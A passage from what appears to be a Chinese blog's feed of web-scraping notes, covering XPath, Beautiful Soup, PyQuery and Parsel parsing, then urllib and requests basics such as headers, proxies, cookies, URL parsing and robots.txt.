align="center">用于索引位置判断</td></tr><tr><td align="center">节点轴</td><td align="center">ancestor::, attribute::, child::, descendant::, following::, following-sibling::</td></tr></tbody></table><p>运算符</p><table><thead><tr><th align="center">运算符</th><th align="center">描述</th><th align="center">实例</th><th align="center">返回值</th></tr></thead><tbody><tr><td align="center">or</td><td align="center">或</td><td align="center">age=19 or age=20</td><td align="center">ture or false</td></tr><tr><td align="center">and</td><td align="center">与</td><td align="center">age&gt;19 and age&lt;21</td><td align="center">ture or false</td></tr><tr><td align="center">mod</td><td align="center">计算除法余数</td><td align="center">5 mod 2</td><td align="center">1</td></tr><tr><td align="center">|</td><td align="center">计算两个节点集</td><td align="center">//book|//cd</td><td align="center">返回所有拥有 book 和 cd 元素的节点集</td></tr><tr><td align="center">+, -, *, div</td><td align="center">加减乘除</td><td align="center">—</td><td align="center">ture or false</td></tr><tr><td align="center">=, !=, &lt;, &lt;=, &gt;, &gt;=</td><td align="center">等于。。。</td><td align="center">—</td><td align="center">ture or false</td></tr></tbody></table><h3 id="Beautiful-Soup-的使用"><a href="#Beautiful-Soup-的使用" class="headerlink" title="Beautiful Soup 的使用"></a>Beautiful Soup 的使用</h3><p>借助网页结构和属性等特性来解析的一个库，它可以自动将输入文档转换为 Unicode 编码，将输出文档转换为 utf-8 编码，还有很多强大的功能，帮助使用者省去许多烦琐工作，提高解析效率。</p><p>Beautiful Soup 解析是依赖解释器的，除了支持 Python 标注库中的 HTML 解释器，还支持其他第三方解释器，如 LXML HTML、LXML XML、html5lib，推荐使用 lxml，初始化的时候这样写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(<span class="string">&#x27;&lt;p&gt;Hello&lt;/p&gt;&#x27;</span>, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">print(soup.p.string)</span><br></pre></td></tr></table></figure><p>可以直接调用节点，调用后包含的常用属性和方法有：</p><ul><li>name: 节点名称</li><li>attrs: 属性内容</li><li>string: 文本内容</li><li>content: 直接子节点</li><li>children: 直接子节点，生成器类型</li><li>descendants: 子孙节点，生成器类型</li><li>parent: 直接父节点；复数取得所有祖先节点，生成器</li><li>previous_sibling: 上一个兄弟节点；复数取得前面所有兄弟节点，生成器</li><li>next_sibling: 下一个兄弟节点；复数取得后面所有兄弟节点，生成器</li></ul><p>Beautiful Soup 还提供许多查询方法：</p><ul><li>find_all(name, attrs, recursive, text, **kwargs) 所有元素，其中 attr 常用属性 id, text, class(关键词，需改为 class_) 可直接使用，如 <code>find_all(id=‘list-1’)</code></li><li>find() 第一个匹配元素</li><li>find_parent() 直接父节点，复数所有祖先节点</li><li>find_next_sibling(), find_previous_sibling()</li><li>find_all_next(), find_next(), find_all_previouf(), find_previous()</li><li>select()：CSS 选择器</li><li>get_text() 同 string 属性</li></ul><h3 id="PyQuery-的使用"><a href="#PyQuery-的使用" class="headerlink" title="PyQuery 的使用"></a>PyQuery 的使用</h3><p>更强大的 CSS 选择器功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line">doc = pq(html)</span><br><span class="line"><span class="comment"># doc = pq(url=&#x27;example.com&#x27;)</span></span><br><span class="line"><span class="comment"># doc = pq(filename=&#x27;demo.html&#x27;)</span></span><br><span class="line">print(doc(<span class="string">&#x27;li&#x27;</span>))</span><br><span class="line">print(doc(<span class="string">&#x27;#container .list li&#x27;</span>))</span><br></pre></td></tr></table></figure><p>需要的参数是 CSS 选择器，常用方法和属性有：</p><ul><li>find() 返回所有子孙节点</li><li>children() 只返回子节点</li><li>parent() 直接父节点，复数是查找祖先节点</li><li>siblings() 兄弟节点</li><li>attr 调用方式可以是 a.attr(‘href’), a.attr.href，如果 a 是多个节点，只会返回第一个节点属性</li><li>text() html() 获取文本和 html 文本</li></ul><p>pyquery 提供了系列方法对节点进行动态修改：</p><ul><li>addClass()  -&gt; li.addClass(‘active’)</li><li>removeClass() -&gt; li.removeClass(‘active’)</li><li>attr() -&gt; li.attr(‘name’, ‘link’)</li><li>text() -&gt; li.text(‘changed item’)</li><li>html() -&gt; li.html(‘&lt;span&gt;changed item&lt;/span&gt;’)</li><li>remove() -&gt; li.find(‘p’).remove()</li></ul><p>CSS 选择器的强大之处还在于支持伪类选择器，下面依次选择了第一个 li 节点、最后一个 li 节点、第二个 li 节点、第三个 li 之后的节点、偶数位置 li 节点、包含 second 文本的 li 节点：</p><ul><li>doc(‘li:first-child’)</li><li>doc(‘li:last-child’)</li><li>doc(‘li:nth-child(2)’)</li><li>doc(‘li.gt(2)’)</li><li>doc(‘li:nth-child(2n’)</li><li>doc(‘li:contains(second)’)</li></ul><h3 id="Parsel-的使用"><a href="#Parsel-的使用" class="headerlink" title="Parsel 的使用"></a>Parsel 的使用</h3><p>这个库可以解析 HTML 和 XML，支持使用 XPath 和 CSS 选择器对内容进行提取和修改，还融合了正则表达式的提取功能，同时也是 Python 最流行的爬虫框架 Scrapy 的底层支持。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> parsel <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line">selector = Selector(text=html)</span><br><span class="line">items = selector.css(<span class="string">&#x27;.item-0&#x27;</span>)</span><br><span class="line">items2 = selector.xpath(<span class="string">&#x27;//li[contains(@class, &quot;item-0&quot;)]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取文本</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">text = item.xpath(<span class="string">&#x27;.//text()&#x27;</span>).get()</span><br><span class="line">print(text)</span><br><span class="line">result = selector.css(<span class="string">&#x27;.item-0 *::text&#x27;</span>).getall()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取属性</span></span><br><span class="line">result = selector.css(<span class="string">&#x27;.item-0.active a::attr(href)&#x27;</span>).get()</span><br><span class="line">result2 = selector.xpath(<span class="string">&#x27;//li[contains(@class, &quot;item-0&quot;) and contains(@class, &quot;active&quot;)]/a/@href&#x27;</span>).get()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正则提取</span></span><br><span class="line">result = selector.css(<span class="string">&#x27;.item-0&#x27;</span>).re(<span class="string">&#x27;link.*&#x27;</span>)</span><br><span class="line">result2 = selector.css(<span class="string">&#x27;.item-0&#x27;</span>).re_first(<span class="string">&#x27;&lt;span class=&quot;bold&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://s2.loli.net/2022/02/15/MUcb8kYIRaP21gN.png&quot; style=&quot;zoom: 67%;&quot; /&gt;

&lt;p&gt;本章我们了解几种解析库的使用，包括 XPath、Beautiful Soup、PyQuery、Parsel，实际可根据场景和个人使用习惯来选择。&lt;/p&gt;</summary>
    
    
    
    <category term="Python" scheme="https://speedpromise.github.io/categories/Python/"/>
    
    
    <category term="爬虫笔记" scheme="https://speedpromise.github.io/tags/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>爬虫笔记二 -- 基本库的使用</title>
    <link href="https://speedpromise.github.io/archives/50c99347.html"/>
    <id>https://speedpromise.github.io/archives/50c99347.html</id>
    <published>2022-02-15T01:09:41.000Z</published>
    <updated>2022-03-02T01:42:30.792Z</updated>
    
    <content type="html"><![CDATA[<img data-src="https://s2.loli.net/2022/02/15/2z4tLguB3OP8nN6.png" style="zoom:67%;" /><p>本章我们了解基础的 HTTP 库，如 urllib、requests、httpx等，最后一起来完成对一个静态网站的爬取案例实战。</p><span id="more"></span><h3 id="urllib-库的使用"><a href="#urllib-库的使用" class="headerlink" title="urllib 库的使用"></a>urllib 库的使用</h3><p>urllib 库包含 4 个模块：request、error、parse、robotparser，具体用法如下：</p><ol><li><strong>发送请求</strong></li></ol><p>使用 request 库，可以很方便的发起请求并得到响应。</p><ul><li><strong>urlopen</strong></li></ul><p>以爬取 Python 官网为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"></span><br><span class="line">response = urllib.request.urlopen(<span class="string">&#x27;https://www.python.org&#x27;</span>)</span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img data-src="https://s2.loli.net/2022/02/15/JdV92QIylBomrgU.png" alt="image-20220215101452116"></p><p>可看到我们得到了网页的源代码，其中的链接、图片、文本信息就可以提取出来了。</p><p>使用 <code>print(type(response))</code>，输出结果是<code>&lt;class &#39;http.client.HTTPResponse&#39;</code>，响应是一个 HTTPResponse 类型的对象，主要包含 read、readinto、getheader、getheaders、fileno 等方法，以及 msg、version、status、reason、debuglevel、closed 等属性，我们可以调用上述方法和属性，得到返回的一系列信息。</p><p>urlopen最基本用法就是传入 URL 参数，其完整 API 如下：</p><p><code>urllib.request.urlopen(url, data=None, [timeout,]*, cafile=None, capath=None, cadefault=False, context=None)</code></p><p>下面详细说明参数含义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">data：添加该参数时，需要使用 bytes 方法将其参数转化为字节流编码格式的内容，即 bytes 类型。另外，如果传递了这个参数，，请求方式就变为 POST 了。urllib.parse 模块中 的urlencode(data, encode&#x3D;‘utf-8’)可以转化编码，第二个参数指定编码方式；</span><br><span class="line"></span><br><span class="line">timeout：超时时间，单位秒，超时会抛出 socket.timeout 类型的异常</span><br><span class="line"></span><br><span class="line">其他参数：context 参数必须是 ssl.SSLContext 类型，用来指定 SSL 的设置。cafile 和 capath 用来指定 CA 证书和其路径。cadefault 参数已弃用，默认 False。</span><br></pre></td></tr></table></figure><ul><li><strong>Request</strong></li></ul><p>urlopen 发起的是最基本的请求，如果需要加上 Headers 等信息，就得用到 Request 类来构建请求。构造方法如下：</p><p><code>urllib.request.Request(url, data=None, headers=&#123;&#125;, origin_req_host=None, unverifiable=False, method=None)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">url 和 data 参数解释同 urlopen</span><br><span class="line"></span><br><span class="line">headers：请求头，这也可通过调用请求实例的 add_headers 方法添加。最常见的方法就是通过修改 User-Agent 来伪装浏览器，默认的 UA 是 Python-urllib。如可设置 UA 为 Mozilla&#x2F;5.0 (X11; U; Linux i686) Gecko&#x2F;20071127 FireFox&#x2F;2.0.0.11</span><br><span class="line"></span><br><span class="line">origin_req_host：请求方的 host 名称或 IP 地址</span><br><span class="line"></span><br><span class="line">unverifiable：表示请求是否是无法验证的，默认 False，为 True 则表示用户没有权限来接收这个请求结果</span><br><span class="line"></span><br><span class="line">method：指示请求使用的方法，如 GET、POST 和 PUT 等</span><br><span class="line"></span><br><span class="line">其他参数：context 参数必须是 ssl.SSLContext 类型，用来指定 SSL 的设置。cafile 和 capath 用来指定 CA 证书和其路径。cadefault 参数已弃用，默认 False。</span><br></pre></td></tr></table></figure><p>下面尝试构建请求：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request, parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://www.httpbin.org/post&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;www.httpbin.org&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">query = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>&#125;</span><br><span class="line">data = <span class="built_in">bytes</span>(parse.urlencode(query), encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">req = request.Request(url, data, headers, method=<span class="string">&#x27;POST&#x27;</span>)</span><br><span class="line">response = request.urlopen(req)</span><br><span class="line">print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;args&quot;</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">&quot;data&quot;</span>: <span class="string">&quot;&quot;</span>, </span><br><span class="line">  <span class="string">&quot;files&quot;</span>: &#123;&#125;, </span><br><span class="line">  <span class="string">&quot;form&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;germey&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;identity&quot;</span>, </span><br><span class="line">    <span class="string">&quot;Content-Length&quot;</span>: <span class="string">&quot;11&quot;</span>, </span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, </span><br><span class="line">    <span class="string">&quot;Host&quot;</span>: <span class="string">&quot;www.httpbin.org&quot;</span>, </span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Chrome/98.0.4758.80 Safari/537.36 Edg/98.0.1108.50&quot;</span>, </span><br><span class="line">    <span class="string">&quot;X-Amzn-Trace-Id&quot;</span>: <span class="string">&quot;Root=1-620b1624-3d236f007cd3de6c15dfe6ba&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="string">&quot;json&quot;</span>: null, </span><br><span class="line">  <span class="string">&quot;origin&quot;</span>: <span class="string">&quot;117.136.71.145&quot;</span>, </span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://www.httpbin.org/post&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>高级用法</strong></li></ul><p>为了进行 Cookie 处理、代理设置等操作，就绪也用到 urllib.request 中的 BaseHandler 类，有各种子类继承 BaseHandler：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTPDefaultErrorHandler 用于处理响应错误，所有错误会抛出 HTTPError 类型异常</span><br><span class="line">HTTPRedirectHandler 用于处理重定向</span><br><span class="line">HTTPCookieProcessor 用于处理 Cookie</span><br><span class="line">ProxyHandler 用于设置代理，默认为空</span><br><span class="line">HTTPPasswordMgr 用于管理密码</span><br><span class="line">HTTPBasicAuthHandler 用于管理认证</span><br></pre></td></tr></table></figure><ul><li><strong>代理</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.error <span class="keyword">import</span> URLError</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> ProxyHandler, build_opener</span><br><span class="line"></span><br><span class="line">proxy_handler = ProxyHandler(&#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">opener = build_opener(proxy_handler)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    response = opener.<span class="built_in">open</span>(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">    print(response.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="keyword">except</span> URLError <span class="keyword">as</span> e:</span><br><span class="line">    print(e.reason</span><br></pre></td></tr></table></figure><ul><li><strong>Cookie</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.cookiejar, urllib.request</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;cookie.txt&#x27;</span></span><br><span class="line">cookie = http.cookiejar.CookieJar(filename)</span><br><span class="line">handler = urllib.request.HTTPCookieProcessor(cookie)</span><br><span class="line">opener = urllib.request.build_opener(handler)</span><br><span class="line">response = opener.<span class="built_in">open</span>(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br><span class="line">cookie.save(ignore_discard=<span class="literal">True</span>, ignore_expires=<span class="literal">True</span>) <span class="comment"># save as file</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> cookie:</span><br><span class="line">    print(item.name + <span class="string">&#x27;=&#x27;</span> + item.value)</span><br><span class="line"> </span><br><span class="line">------------- result -------------</span><br><span class="line">BAIDUID=BB78F3CB65EB85782F1ECF6B3C04D0DB:FG=<span class="number">1</span></span><br><span class="line">BIDUPSID=BB78F3CB65EB8578C40219B54CB0A2E7</span><br><span class="line">PSTM=<span class="number">1644894666</span></span><br><span class="line">BD_NOT_HTTPS=<span class="number">1</span></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>处理异常</strong></li></ol><ul><li><strong>URLError</strong></li></ul><p>来自 urllib库的 error 模块，继承自 OSError 模块，由 request 模块产生的异常都可以用这个类处理。</p><ul><li><strong>HTTPError</strong><ul><li>code：HTTP状态码</li><li>reason：返回错误原因</li><li>headers：返回请求头</li></ul></li></ul><p>URLError 的子类，专门用于处理 HTTP 请求错误，有 3 个属性。</p><ol start="3"><li><strong>解析链接</strong></li></ol><p>本小节介绍 parse 模块的常用方法。</p><ul><li><strong>urlparse</strong></li></ul><p>API <code>urllib.parse.urlparse(urlstring, scheme=&#39;&#39;, allow_fragments=True)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">urlstring：必填项，待解析 URL</span><br><span class="line">scheme：默认协议（如 http、https 等）。如果 urlstring 没有带协议值，则赋该值</span><br><span class="line">allow_fragments：是否忽略 fragment，如果忽略，则会被解析为 path、params 或 query 的一部分</span><br><span class="line">----------------------------------</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line">result = urlparse(<span class="string">&#x27;https://www.baidu.com/index.html;user?a=6#comment&#x27;</span>)</span><br><span class="line">print(<span class="built_in">type</span>(result))</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">urllib</span>.<span class="title">parse</span>.<span class="title">ParseResult</span>&#x27;&gt;</span></span><br><span class="line"><span class="class"><span class="title">ParseResult</span>(<span class="params">scheme=<span class="string">&#x27;https&#x27;</span>, netloc=<span class="string">&#x27;www.baidu.com&#x27;</span>, path=<span class="string">&#x27;/index.html&#x27;</span>, params<span class="string">&#x27;user&#x27;</span>, query=<span class="string">&#x27;id=5&#x27;</span>, fragment=<span class="string">&#x27;comment&#x27;</span></span>)</span></span><br></pre></td></tr></table></figure><ul><li><strong>urlunparse</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlunparse</span><br><span class="line"></span><br><span class="line">data = [<span class="string">&#x27;https&#x27;</span>, <span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;a=6&#x27;</span>, <span class="string">&#x27;comment&#x27;</span>]</span><br><span class="line">print(urlunparse(data))</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">https://www.baidu.com/index.html;user?a=6#comment</span><br></pre></td></tr></table></figure><ul><li><strong>urlsplit、urlunsplit</strong></li></ul><p>和 urlparse、urlunparse 很相似，但不在单独解析 params，也不用组合 params内容 。</p><ul><li><strong>urljoin</strong></li></ul><p>API <code>urllib.parse.urljoin(base_url, new_url)</code></p><p>urljoin 会分析 base_url  中的 scheme、netloc 和 path，并对 new_url 缺失的部分进行补充，最后返回结果。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">urljoin(<span class="string">&#x27;https://www.baidu.com?wd=abc&#x27;</span>, <span class="string">&#x27;https://example.com/index.php&#x27;</span>)</span><br><span class="line">urljoin(<span class="string">&#x27;https://www.baidu.com&#x27;</span>, <span class="string">&#x27;?category=2#comment&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">https://example.com/index.php</span><br><span class="line">https://www.baidu.com?category=2#comment</span><br></pre></td></tr></table></figure><ul><li><strong>urlencode</strong></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br><span class="line">base_url = <span class="string">&#x27;https;//www.baidu.com&#x27;</span></span><br><span class="line">url = base_url + urlencode(params)</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">https;//www.baidu.com?name=germey&amp;age=25</span><br></pre></td></tr></table></figure><ul><li><strong>parse_qs</strong></li></ul><p>反序列化，可将一串 GET 请求参数转化为字典。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> parse_qs</span><br><span class="line"></span><br><span class="line">query = <span class="string">&#x27;name=germey&amp;age=25&#x27;</span></span><br><span class="line">print(parse_qs(query))</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: [<span class="string">&#x27;germey&#x27;</span>], <span class="string">&#x27;age&#x27;</span>: [<span class="string">&#x27;25&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>parse_qsl</strong></li></ul><p>与 parse_qs 相似，但运行结果是元组列表，运行结果如下：</p><p><code>&#123;(&#39;name&#39;: &#39;germey&#39;), (&#39;age&#39;: &#39;25&#39;)&#125;</code></p><ul><li><strong>quote</strong></li></ul><p>将内容转化为 URL 编码格式。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">keyword = <span class="string">&#x27;壁纸&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;https://www.baidu.com/s?wd=&#x27;</span> + quote(keyword)</span><br><span class="line">print(url)</span><br><span class="line"></span><br><span class="line">------------- result -------------</span><br><span class="line">https://www.baidu.com/s?wd=%E5%A3%81%E7%BA%B8</span><br></pre></td></tr></table></figure><ul><li><strong>unquote</strong></li></ul><p>URL 解码，用上面代码运行结果可以解码出中文。</p><ul><li><strong>Robots 协议</strong></li></ul><p>也叫做爬虫协议、机器人协议，全名为网络爬虫排除标准（Robots Exclusion Protocol），用来告诉爬虫和搜索引擎哪些页面可以抓取、哪些不可以。通常是一个 robots.txt 的文本文件，放在网站根目录下。</p><p>样例，限定搜索爬虫只能爬取 public 目录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: * <span class="comment"># 搜索爬虫名称，常见名称见下表</span></span><br><span class="line">Disallow: /</span><br><span class="line">Allow: /public/</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">爬虫名称</th><th align="center">网站名称</th></tr></thead><tbody><tr><td align="center">BaiduSpider</td><td align="center">百度</td></tr><tr><td align="center">Googlebot</td><td align="center">谷歌</td></tr><tr><td align="center">360Spider</td><td align="center">360 搜索</td></tr><tr><td align="center">YodaoBot</td><td align="center">有道</td></tr><tr><td align="center">ia_archiver</td><td align="center">Alexa</td></tr><tr><td align="center">Scooter</td><td align="center">altavista</td></tr><tr><td align="center">Bingbot</td><td align="center">必应</td></tr></tbody></table><p>了解 Robots 协议后，就可以使用 robotparser 模块来解析 robots.txt 文件了，用法：</p><p><code>urllib.robotparse.RobotFileParse(url=&#39;&#39;)</code></p><h3 id="requests-的使用"><a href="#requests-的使用" class="headerlink" title="requests 的使用"></a>requests 的使用</h3><p>requests 库比 urllib 库更强大，在处理网页验证、Cookie 以及实现 POST、PUT 等请求会更方便。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;example.com&#x27;</span></span><br><span class="line">headers = &#123; <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;...&#x27;</span> &#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;germey&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;age&#x27;</span>: <span class="number">25</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url, headers=headers, params=data) <span class="comment"># 